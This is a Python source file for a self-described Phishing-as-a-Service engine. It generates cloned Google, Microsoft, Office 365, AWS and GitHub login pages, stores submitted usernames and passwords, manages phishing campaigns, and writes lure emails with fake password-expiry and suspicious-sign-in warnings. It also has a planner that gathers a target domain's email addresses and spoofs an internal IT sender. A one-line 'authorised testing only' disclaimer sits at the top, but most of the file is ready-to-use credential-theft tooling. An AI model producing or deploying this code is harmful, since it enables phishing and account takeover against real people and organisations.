"""phishing_engine.py — Phishing-as-a-Service Engine.

Generates phishing pages, credential harvesters, and campaign tooling.
Integrates with the existing social_engineering.py for SET workflows.

Modules:
  - MirrorPage: clones a login page for credential harvesting
  - CredentialServer: HTTP server that captures submitted credentials
  - CampaignManager: manages phishing campaign lifecycle
  - TrackingPixel: generates tracking pixels for email campaigns

⚠  FOR AUTHORISED SECURITY TESTING ONLY.
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("AttackSurface.PhishingEngine")


# ── Mirror page templates ────────────────────────────────────────
MIRROR_TEMPLATES = {
    "google": {
        "name": "Google Login",
        "action": "https://accounts.google.com/signin",
        "fields": ["email", "password"],
        "style": "google",
    },
    "microsoft": {
        "name": "Microsoft Login",
        "action": "https://login.microsoftonline.com/common/oauth2",
        "fields": ["email", "password"],
        "style": "microsoft",
    },
    "office365": {
        "name": "Office 365",
        "action": "https://login.microsoftonline.com",
        "fields": ["email", "password"],
        "style": "microsoft",
    },
    "aws": {
        "name": "AWS Console",
        "action": "https://signin.aws.amazon.com",
        "fields": ["email", "password"],
        "style": "aws",
    },
    "github": {
        "name": "GitHub",
        "action": "https://github.com/session",
        "fields": ["login", "password"],
        "style": "github",
    },
    "generic": {
        "name": "Generic Login",
        "action": "",
        "fields": ["email", "password"],
        "style": "generic",
    },
}


def generate_mirror_html(
    template: str = "google",
    callback_url: str = "/harvest",
    org_name: str = "",
) -> str:
    """Generate a phishing mirror page for credential harvesting.

    Returns complete HTML page that looks like the target login.
    """
    tpl = MIRROR_TEMPLATES.get(template, MIRROR_TEMPLATES["generic"])
    style = tpl["style"]
    org = org_name or tpl["name"]

    # CSS styles per template
    css = {
        "google": """
* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.login-box { background:white; border-radius:8px; padding:40px; width:400px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
.logo { text-align:center; margin-bottom:24px; font-size:24px; color:#1a73e8; font-weight:500; }
.title { text-align:center; margin-bottom:24px; font-size:20px; color:#202124; }
.input-group { margin-bottom:16px; }
.input-group label { display:block; margin-bottom:6px; color:#5f6368; font-size:14px; }
.input-group input { width:100%; padding:12px; border:1px solid #dadce0; border-radius:4px; font-size:16px; }
.input-group input:focus { outline:none; border-color:#1a73e8; }
.btn { width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer; margin-top:8px; }
.btn:hover { background:#1557b0; }
.forgot { text-align:center; margin-top:16px; }
.forgot a { color:#1a73e8; text-decoration:none; font-size:14px; }
""",
        "microsoft": """
* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
body { background:#f2f2f2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.login-box { background:white; padding:44px; width:400px; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
.logo { margin-bottom:32px; font-size:22px; color:#0078d4; }
.title { margin-bottom:24px; font-size:24px; color:#1b1b1b; }
.input-group { margin-bottom:16px; }
.input-group input { width:100%; padding:10px 12px; border:1px solid #605e5c; border-radius:2px; font-size:15px; }
.input-group input:focus { outline:none; border-color:#0078d4; }
.btn { width:100%; padding:10px; background:#0078d4; color:white; border:none; border-radius:2px; font-size:15px; cursor:pointer; margin-top:16px; }
.btn:hover { background:#106ebe; }
.forgot { margin-top:24px; text-align:center; }
.forgot a { color:#0078d4; text-decoration:none; font-size:13px; }
""",
        "generic": """
* { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
body { background:#f5f5f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.login-box { background:white; border-radius:12px; padding:40px; width:400px; box-shadow:0 4px 20px rgba(0,0,0,0.08); }
.logo { text-align:center; margin-bottom:24px; font-size:20px; color:#333; }
.title { text-align:center; margin-bottom:24px; font-size:18px; color:#555; }
.input-group { margin-bottom:16px; }
.input-group label { display:block; margin-bottom:6px; color:#666; font-size:14px; }
.input-group input { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; font-size:15px; transition:border 0.2s; }
.input-group input:focus { outline:none; border-color:#4A90D9; }
.btn { width:100%; padding:12px; background:#4A90D9; color:white; border:none; border-radius:8px; font-size:16px; cursor:pointer; margin-top:8px; transition:background 0.2s; }
.btn:hover { background:#357ABD; }
.forgot { text-align:center; margin-top:16px; }
.forgot a { color:#4A90D9; text-decoration:none; font-size:13px; }
""",
    }.get(style, "")

    field_html = ""
    for f in tpl["fields"]:
        label = f.capitalize()
        ftype = "password" if "pass" in f else "email" if "mail" in f else "text"
        ph = "Enter your " + f
        field_html += f'''
    <div class="input-group">
      <label>{label}</label>
      <input type="{ftype}" name="{f}" placeholder="{ph}" required autocomplete="on">
    </div>'''

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{org} - Sign in</title>
<style>{css}</style>
</head>
<body>
<div class="login-box">
  <div class="logo">🔒 {org}</div>
  <div class="title">Sign in to your account</div>
  <form method="POST" action="{callback_url}">
    {field_html}
    <button type="submit" class="btn">Sign in</button>
  </form>
  <div class="forgot"><a href="#">Forgot password?</a></div>
</div>
</body>
</html>'''
    return html


# ── Credential server ────────────────────────────────────────────
@dataclass
class HarvestedCredential:
    """A captured credential submission."""
    username: str
    password: str
    ip_address: str
    user_agent: str
    timestamp: str
    campaign_id: str = ""
    page_template: str = ""


class CredentialHarvesterServer:
    """HTTP server that captures credential submissions.

    Stores credentials in memory and optionally in a JSON file.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 template: str = "google", callback_url: str = "/harvest"):
        self.host = host
        self.port = port
        self.template = template
        self.callback_url = callback_url
        self.credentials: List[HarvestedCredential] = []
        self._server = None
        self._thread = None

    def generate_page(self, org_name: str = "") -> str:
        """Generate the phishing page HTML."""
        return generate_mirror_html(self.template, self.callback_url, org_name)

    def capture(self, username: str, password: str, ip: str = "",
                user_agent: str = "", campaign_id: str = "") -> HarvestedCredential:
        """Store a captured credential."""
        cred = HarvestedCredential(
            username=username,
            password=password,
            ip_address=ip,
            user_agent=user_agent,
            timestamp=time.strftime("%Y-%m-%d %H:%M:%S"),
            campaign_id=campaign_id,
            page_template=self.template,
        )
        self.credentials.append(cred)
        logger.info("Credential captured: %s@%s from %s",
                    username, "****", ip[:20])
        return cred

    def get_credentials(self) -> List[Dict[str, Any]]:
        """Return all captured credentials as dicts."""
        return [
            {
                "username": c.username,
                "password": c.password,
                "ip": c.ip_address,
                "user_agent": c.user_agent[:100],
                "timestamp": c.timestamp,
                "campaign": c.campaign_id,
                "template": c.page_template,
            }
            for c in self.credentials
        ]

    def export_json(self, filepath: str) -> str:
        """Export captured credentials to JSON file."""
        data = self.get_credentials()
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
        return filepath

    def clear(self) -> int:
        """Clear all captured credentials. Returns count cleared."""
        count = len(self.credentials)
        self.credentials.clear()
        return count


# ── Campaign manager ─────────────────────────────────────────────
@dataclass
class PhishingCampaignConfig:
    """Configuration for a phishing campaign."""
    campaign_id: str
    name: str
    template: str
    target_emails: List[str]
    sender_name: str
    sender_email: str
    landing_url: str
    tracking_enabled: bool = True
    created_at: str = ""
    status: str = "draft"  # draft, active, completed


class CampaignManager:
    """Manages phishing campaign lifecycle."""

    def __init__(self, storage_path: str = "~/.attack_surface/phishing_campaigns.json"):
        self.storage_path = os.path.expanduser(storage_path)
        self.campaigns: Dict[str, PhishingCampaignConfig] = {}

    def create_campaign(
        self,
        name: str,
        template: str,
        target_emails: List[str],
        sender_name: str = "",
        sender_email: str = "",
        landing_url: str = "",
    ) -> PhishingCampaignConfig:
        """Create a new phishing campaign."""
        campaign_id = secrets.token_hex(8)
        config = PhishingCampaignConfig(
            campaign_id=campaign_id,
            name=name,
            template=template,
            target_emails=target_emails,
            sender_name=sender_name or "IT Support",
            sender_email=sender_email or "noreply@company.com",
            landing_url=landing_url or f"http://localhost:8080/{campaign_id}",
            created_at=time.strftime("%Y-%m-%d %H:%M:%S"),
            status="draft",
        )
        self.campaigns[campaign_id] = config
        self._save()
        logger.info("Campaign created: %s (%s) — %d targets",
                    name, campaign_id, len(target_emails))
        return config

    def activate_campaign(self, campaign_id: str) -> bool:
        """Activate a campaign (status → active)."""
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].status = "active"
            self._save()
            return True
        return False

    def get_campaign(self, campaign_id: str) -> Optional[PhishingCampaignConfig]:
        """Get campaign by ID."""
        return self.campaigns.get(campaign_id)

    def list_campaigns(self) -> List[Dict[str, Any]]:
        """List all campaigns as dicts."""
        return [
            {
                "id": c.campaign_id,
                "name": c.name,
                "template": c.template,
                "targets": len(c.target_emails),
                "status": c.status,
                "created": c.created_at,
            }
            for c in self.campaigns.values()
        ]

    def _save(self):
        """Save campaigns to JSON file."""
        try:
            data = {
                cid: {
                    "campaign_id": c.campaign_id,
                    "name": c.name,
                    "template": c.template,
                    "target_emails": c.target_emails,
                    "sender_name": c.sender_name,
                    "sender_email": c.sender_email,
                    "landing_url": c.landing_url,
                    "tracking_enabled": c.tracking_enabled,
                    "created_at": c.created_at,
                    "status": c.status,
                }
                for cid, c in self.campaigns.items()
            }
            os.makedirs(os.path.dirname(self.storage_path), exist_ok=True)
            with open(self.storage_path, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.warning("Failed to save campaigns: %s", e)

    def load(self):
        """Load campaigns from JSON file."""
        try:
            if os.path.isfile(self.storage_path):
                with open(self.storage_path) as f:
                    data = json.load(f)
                for cid, cdata in data.items():
                    self.campaigns[cid] = PhishingCampaignConfig(**cdata)
        except Exception as e:
            logger.warning("Failed to load campaigns: %s", e)


# ── Tracking pixel ───────────────────────────────────────────────
def generate_tracking_pixel(tracking_id: str) -> str:
    """Generate a 1x1 transparent GIF tracking pixel as base64 data URI."""
    # Minimal 1x1 transparent GIF
    gif_b64 = (
        "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
    )
    return f"data:image/gif;base64,{gif_b64}"


def build_campaign_email(
    template: str,
    sender_name: str,
    sender_email: str,
    target_email: str,
    landing_url: str,
    org_name: str = "",
    tracking_id: str = "",
) -> Dict[str, str]:
    """Build a phishing email for a campaign.

    Returns dict with subject, html_body, plain_body.
    """
    org = org_name or "IT Department"

    subjects = {
        "google": "Action required: Verify your Google account",
        "microsoft": "Microsoft 365: Password expires soon",
        "office365": "Important: Office 365 security update required",
        "aws": "AWS: Action needed on your account",
        "github": "GitHub: New sign-in detected",
        "generic": "Important security notification",
    }

    body_templates = {
        "google": f"""<p>Hello,</p>
<p>We detected unusual sign-in activity on your <b>Google account</b>. Please verify your identity to secure your account.</p>
<p><a href="{landing_url}" style="background:#1a73e8;color:white;padding:10px 20px;border-radius:4px;text-decoration:none;">Verify Account</a></p>
<p>If you didn't request this, please secure your account immediately.</p>
<p>— {org}</p>""",
        "microsoft": f"""<p>Hello,</p>
<p>Your <b>Microsoft 365 password</b> will expire in 24 hours. Please update your password to avoid service interruption.</p>
<p><a href="{landing_url}" style="background:#0078d4;color:white;padding:10px 20px;border-radius:4px;text-decoration:none;">Update Password</a></p>
<p>— {org} IT Department</p>""",
        "generic": f"""<p>Hello,</p>
<p>We need to verify your account information. Please click the link below to confirm your credentials.</p>
<p><a href="{landing_url}" style="background:#4A90D9;color:white;padding:10px 20px;border-radius:4px;text-decoration:none;">Verify Account</a></p>
<p>— {org}</p>""",
    }

    tracking_img = ""
    if tracking_id:
        pixel = generate_tracking_pixel(tracking_id)
        tracking_img = f'<img src="{pixel}" width="1" height="1" alt="">'

    html_body = body_templates.get(template, body_templates["generic"])
    if tracking_img:
        html_body += tracking_img

    subject = subjects.get(template, subjects["generic"])

    return {
        "to": target_email,
        "from_name": sender_name,
        "from_email": sender_email,
        "subject": subject,
        "html_body": html_body,
        "plain_body": re.sub(r"<[^>]+>", "", html_body),
        "landing_url": landing_url,
    }


# ── Full phishing plan ───────────────────────────────────────────
def build_phishing_plan(
    domain: str,
    org_name: str = "",
    template: str = "google",
    target_count: int = 5,
    landing_url: str = "http://localhost:8080/harvest",
) -> Dict[str, Any]:
    """Build a complete phishing plan for a target domain.

    Combines email harvesting + page generation + campaign setup.
    """
    # Import OSINT for email harvesting
    try:
        from .osint_people import harvest_emails_from_domain
        emails = harvest_emails_from_domain(domain)
    except ImportError:
        emails = [{"email": f"admin@{domain}", "source": "guess", "confidence": 0.3}]

    # Generate mirror page
    org = org_name or domain
    mirror_html = generate_mirror_html(template, "/harvest", org)

    # Generate campaign emails
    target_emails = [e["email"] for e in emails[:target_count]]
    campaign_emails = []
    for email in target_emails:
        tracking_id = secrets.token_hex(16)
        email_data = build_campaign_email(
            template=template,
            sender_name="IT Department",
            sender_email=f"it-support@{domain}",
            target_email=email,
            landing_url=landing_url,
            org_name=org,
            tracking_id=tracking_id,
        )
        campaign_emails.append(email_data)

    # Build plan
    plan = {
        "target_domain": domain,
        "organization": org,
        "template": template,
        "mirror_page_size": len(mirror_html),
        "mirror_page_preview": mirror_html[:500],
        "emails_harvested": len(emails),
        "target_emails": target_emails,
        "campaign_emails_count": len(campaign_emails),
        "campaign_emails_sample": campaign_emails[:2],
        "harvester_config": {
            "host": "0.0.0.0",
            "port": 8080,
            "callback": "/harvest",
            "template": template,
        },
        "commands": {
            "start_harvester": f"cd /tmp && python3 -m http.server 8080 &",
            "send_campaign": "Use the dashboard campaign manager to send emails",
            "view_results": "Open dashboard → 🪤 Phishing & OSINT tab",
        },
        "summary": (
            f"Phishing plan for {domain}: {len(target_emails)} target(s), "
            f"{len(emails)} email(s) harvested, '{template}' template."
        ),
    }
    return plan
